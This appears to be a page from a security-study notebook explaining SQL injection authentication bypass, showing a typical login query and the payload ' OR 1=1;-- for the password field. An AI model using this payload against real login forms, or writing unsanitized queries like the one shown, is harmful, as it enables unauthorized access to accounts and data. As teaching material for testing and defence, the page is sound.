---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Specific Scenarios

We can implement SQL Injection in various scenarios, where user input is inadequately sanitized and embedded directly into SQL queries. Here are some common scenarios:

## <mark style="color:orange;">Authentication Bypass</mark>

A method that consists of considering that the web application isn't interested in the content of the username and password, but in making a matching pair in the users' table.

* We assume the DB uses typical query for authentication

{% code overflow="wrap" lineNumbers="true" %}
```sql
SELECT * from users WHERE username='%user%' and password='%password%' LIMIT 1;
```
{% endcode %}

{% hint style="info" %}
`%user%` and `%password%` are the values received on a login form
{% endhint %}

***

* We can do a malicious insertion on the password field

{% code overflow="wrap" lineNumbers="true" %}
```sql
' OR 1=1;-- #Use this comparison to cheat on verification
#This will enumerate the users from the database
```
{% endcode %}

{% hint style="info" %}
After the `; --` is mandatory to put a space
{% endhint %}
